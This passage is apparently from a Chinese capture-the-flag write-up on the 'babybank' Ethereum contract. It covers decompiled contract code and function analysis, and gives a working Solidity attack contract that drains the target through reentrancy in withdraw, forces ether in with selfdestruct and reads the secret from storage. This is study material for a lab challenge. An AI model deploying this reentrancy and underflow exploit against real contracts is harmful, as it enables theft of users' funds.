                }
            } else {
                var temp20 = returndata.length;
                memory[0x00:0x00 + temp20] = returndata[0x00:0x00 + temp20];
                revert(memory[0x00:0x00 + returndata.length]);
            }
        }
        function func_045C(var arg0) {
            if (msg.sender != storage[0x02] & 0xffffffffffffffffffffffffffffffffffffffff) { revert(memory[0x00:0x00]); }
            storage[0x03] = arg0;
        }
        function guess(var arg0) {
            if (arg0 != storage[0x03]) { revert(memory[0x00:0x00]); }
            memory[0x00:0x20] = msg.sender;
            memory[0x20:0x40] = 0x01;
        // level == 1
            if (storage[keccak256(memory[0x00:0x40])] != 0x01) { revert(memory[0x00:0x00]); }
            memory[0x00:0x20] = msg.sender;
            memory[0x20:0x40] = 0x00;
            // 余额
            var temp0 = keccak256(memory[0x00:0x40]);
            storage[temp0] = storage[temp0] + 0x01;
            // level
            memory[0x20:0x40] = 0x01;
            var temp1 = keccak256(memory[0x00:0x40]);
            storage[temp1] = storage[temp1] + 0x01;
        }
        function transfer(var arg0, var arg1) {
            memory[0x00:0x20] = msg.sender;
            memory[0x20:0x40] = 0x00;
            if (arg1 > storage[keccak256(memory[0x00:0x40])]) { revert(memory[0x00:0x00]); }
        // balance == 2
            if (arg1 != 0x02) { revert(memory[0x00:0x00]); }
            memory[0x00:0x20] = msg.sender;
            memory[0x20:0x40] = 0x01;
        // level == 2
            if (storage[keccak256(memory[0x00:0x40])] != 0x02) { revert(memory[0x00:0x00]); }
            memory[0x00:0x20] = msg.sender;
            memory[0x20:0x40] = 0x00;
            storage[keccak256(memory[0x00:0x40])] = 0x00;
            memory[0x00:0x20] = arg0 & 0xffffffffffffffffffffffffffffffffffffffff;
            storage[keccak256(memory[0x00:0x40])] = arg1;
        }
        function func_0555(var arg0) returns (var arg0) {
            memory[0x20:0x40] = 0x01;
            memory[0x00:0x20] = arg0;
            return storage[keccak256(memory[0x00:0x40])];
        }
        function balance(var arg0) returns (var arg0) {
            memory[0x20:0x40] = 0x00;
            memory[0x00:0x20] = arg0;
            return storage[keccak256(memory[0x00:0x40])];
        }
    }
而逆向出来的代码便成为我们做题的关键。下面就进行分析。
首先我们要注意的地方是在每个函数前均有一句话：
    var var1 = msg.value;
    if (var1) { revert(memory[0x00:0x00]); }
这句话非常关键，它表示我们无法在调用函数的时候在value中赋值。我也尝试过在value中输入值时它便会报错。
这个问题若不解决那么后面便无法继续做题，具体遇到的坑在后面进行讲解。
后面我们看合约中的关键函数：
首先是`profit()`。
    function profit() {
            memory[0x00:0x20] = msg.sender;
            memory[0x20:0x40] = 0x01;
        // 当level=1 跳出
            if (storage[keccak256(memory[0x00:0x40])]) { revert(memory[0x00:0x00]); }
            if (msg.sender & 0xffff != 0xb1b1) { revert(memory[0x00:0x00]); }
            memory[0x00:0x20] = msg.sender;
            memory[0x20:0x40] = 0x00;
            var temp0 = keccak256(memory[0x00:0x40]);
            storage[temp0] = storage[temp0] + 0x01;
            memory[0x20:0x40] = 0x01;
            var temp1 = keccak256(memory[0x00:0x40]);
            storage[temp1] = storage[temp1] + 0x01;
        }
该函数首先会对msg.sender的level值进行判断，需要满足level==0才能进入该函数。之后多了一条最重要的判断，那就是需要msg.sender的地址满足前四位为b1b1（这个限制真的有毒，在进行题目尝试的阶段我最终创建了10+个b1b1账户）。如果上述条件均满足，那么合约将用户的余额+1并将lvel+1
。也就是执行完之后level==1 。
下面看guess()函数。
    function guess(var arg0) {
            if (arg0 != storage[0x03]) { revert(memory[0x00:0x00]); }
            memory[0x00:0x20] = msg.sender;
            memory[0x20:0x40] = 0x01;
        // level == 1
            if (storage[keccak256(memory[0x00:0x40])] != 0x01) { revert(memory[0x00:0x00]); }
            memory[0x00:0x20] = msg.sender;
            memory[0x20:0x40] = 0x00;
            // 余额
            var temp0 = keccak256(memory[0x00:0x40]);
            storage[temp0] = storage[temp0] + 0x01;
            // level
            memory[0x20:0x40] = 0x01;
            var temp1 = keccak256(memory[0x00:0x40]);
            storage[temp1] = storage[temp1] + 0x01;
        }
调用此函数的条件为level==1，且传入的参数arg0需要等于`storage[0x03]`。而这里的`storage[0x03]`为`uint
secret`。而这个参数为区块上的一个参数，所以我们可以通过web3的接口对链上数据进行读取。
`web3.eth.getStorageAt("0xd630cb8c3bbfd38d1880b8256ee06d168ee3859c", 3,
function(x, y) {console.warn(y)});`
当条件全部满足后，该账户余额将+1，且level+1 。
下面是`transfer`函数。
    function transfer(var arg0, var arg1) {
            memory[0x00:0x20] = msg.sender;
            memory[0x20:0x40] = 0x00;
            if (arg1 > storage[keccak256(memory[0x00:0x40])]) { revert(memory[0x00:0x00]); }
        // balance == 2
            if (arg1 != 0x02) { revert(memory[0x00:0x00]); }
            memory[0x00:0x20] = msg.sender;
            memory[0x20:0x40] = 0x01;
        // level == 2
            if (storage[keccak256(memory[0x00:0x40])] != 0x02) { revert(memory[0x00:0x00]); }
            memory[0x00:0x20] = msg.sender;
            memory[0x20:0x40] = 0x00;
            storage[keccak256(memory[0x00:0x40])] = 0x00;
            memory[0x00:0x20] = arg0 & 0xffffffffffffffffffffffffffffffffffffffff;
            storage[keccak256(memory[0x00:0x40])] = arg1;
        }
该函数传入两个参数，分别代表收款人与转账金额。函数需要满足转账金额要小于用户余额，且规定了余额必须为2，level必须为2 。之后收款方账户的余额变为2 。
最后一个最重要的函数为`withdraw`。
    function withdraw(var arg0) {
            if (arg0 != 0x02) { revert(memory[0x00:0x00]); }
            memory[0x00:0x20] = msg.sender;
            memory[0x20:0x40] = 0x00;
            if (arg0 > storage[keccak256(memory[0x00:0x40])]) { revert(memory[0x00:0x00]); }
            var temp0 = memory[0x40:0x60];
            var temp1 = arg0;
            memory[temp0:temp0 + 0x00] = address(msg.sender).call.gas(msg.gas).value(temp1 * 0x5af3107a4000)(memory[temp0:temp0 + 0x00]);
            memory[0x00:0x20] = msg.sender;
            memory[0x20:0x40] = 0x00;
            var temp2 = keccak256(memory[0x00:0x40]);
            storage[temp2] = storage[temp2] - temp1;
        }
该函数要求传入参数为2，即取款2
token。且满足用于余额转账金额，只要满足了这个条件那么后面的减法就不会存在溢出的情况。
于是我们就需要在中间的call函数处做手脚。我们知道当合约调用call函数时将会触发收款方的fallback函数，所以我们只需要定义该合约的fallback函数从而完成对合约的攻击即可。
即当满足条件时，系统执行到.call语句，此时收款方收到钱，然后执行fallback函数再次调用withdraw函数。由于.call还未执行完，所以此时函数还未执行最后的减法，这是再次进入一个withdraw函数。所以类似于函数做了一半然后去执行另一个函数，从而第二个withdraw函数同样可以满足预设条件从而进入。
当第二次函数执行完后，用户的钱已经变成了2 - 2 = 0，此时回到了第一个函数中.call位置，之后继续执行，余额为 0 - 2 =
-2（溢出）。从而完成攻击。
这里为什么不使用其他的函数呢？我们在执行的过程中进行过尝试，由于前面的函数均存在很严格的限制，且执行具有一定顺序，所以我们无法减少用户的余额，并且用户余额减少函数只有transfer与withdraw。无法进行。
三、做题步骤
本章我们对该合约攻击的过程进行详细的复现。
首先我们需要生成b1b1账户用于让合约有token。此网站可以满足需求：。
之后我们令此账户依次调用profit、guess。
此时合约中的余额与level分别为1 1 -> 2 2。之后我们调用transfer函数，将此余额转账到攻击合约中。
令攻击合约拥有2token 。
    pragma solidity ^0.4.23;
    contract babybank {
        mapping(address => uint) public balance;
        mapping(address => uint) public level;
        address owner;
        uint secret;
        //Don't leak your teamtoken plaintext!!! md5(teamtoken).hexdigest() is enough.
        //Gmail is ok. 163 and qq may have some problems.
        event sendflag(string md5ofteamtoken,string b64email); 
        constructor()public{
            owner = msg.sender;
        }
        function transfer(address a,uint b);
        //pay for flag
        function payforflag(string md5ofteamtoken,string b64email) public{
            require(balance[msg.sender] >= 10000000000);
            balance[msg.sender]=0;
            owner.transfer(address(this).balance);
            emit sendflag(md5ofteamtoken,b64email);
        }
        modifier onlyOwner(){
            require(msg.sender == owner);
            _;
        }
        function withdraw(uint arg0){}
        function balance(address a) view returns (uint b) {}
    }
    contract hack{
        babybank a;
        uint count = 0;
        event log(uint256);
        constructor(address b)public{
            a = babybank(b);
        }
        function () public payable {
            if(count==2){
                log(3);
            }else{
                count = count + 1;
          a.withdraw(2);
            log(1);
            }
        }
        function getMoney() public payable{}
        function hacker() public{
            a.withdraw(2);
            log(2);
        }
        function payforflag1(string md5ofteamtoken,string b64email) public{
            a.payforflag(md5ofteamtoken,b64email);
        }
        function kill() {
          selfdestruct(0xd630cb8c3bbfd38d1880b8256ee06d168ee3859c);
        }
    }
此时合约中拥有2token的代币。
在做题过程中，我们接下来就开始进行攻击了，但是尝试了好久都没有造成溢出，同样每次尝试代价都非常大，因为要生成b1b1账户，这出题人真的会挖坑。。之后我们发现其题目合约中并没有以太币，没有以太币意味着.call根本不会调用。。所以我们还需要给他转账。然鹅所有的函数如开题所说那样被锁死无法传入value。那我们应该怎么让合约有钱呢？第一我们可以利用合约里面自带的钱，当然这个太难了，因为需要等待别人传。第二我们就需要利用自杀函数来帮助我们强制转账。
我们知道`selfdestruct(0xd630cb8c3bbfd38d1880b8256ee06d168ee3859c);`语句可以帮助我们销毁合并并将合约中的钱全部转到括号中的地址内。
于是我们尝试：
传入0.2ether 给合约并调用getmoney进行收款。
之后调用kill函数进行自杀，从而将钱强制转到合约中。此时题目合约中多了0.2ether。
之后便可以做题了。
由代码分析我们得出代码中的关键函数分别为：guess、profit、transfer、withdraw。且合约中存在两个关键变量：balance（余额）以及level（一种标记）。在审计合约之后我们发现profit函数为：每个账户只允许调用一次，并发送钱包1
token；guess函数需要level值为1且调用后余额+1、leve+1
；而transfer函数满足必须balance与level同时为2才能调用，且调用后收款方余额变为2，且转账方余额变为0
；withdraw函数表示取款，且合约会将以太币转给msg.sender。
  * 1 由于合约本身没有以太币，所以我们先生成合约A调用自杀函数给题目转钱。
  * 2 进行转账操作，我们使用账户B分别调用profit()、guess()、transfer()给C账户转2token。
  * 3 当C有了2token便可以进行攻击，调用hacker函数即可。
当攻击合约中显示自己的余额为2时，便可以调用`hacker`函数。在攻击函数中我控制了执行次数，因为当执行次数过高时有可能引起gas不足从而导致失败而影响最后的结果。
这里仅执行两次。并添加了log事件便于我们查看执行情况。
之后溢出成功，我们成功得到了大量的代币。
我们调用获取flag函数，得到如下日志：
**本稿为原创稿件，转载请标明出处。谢谢。**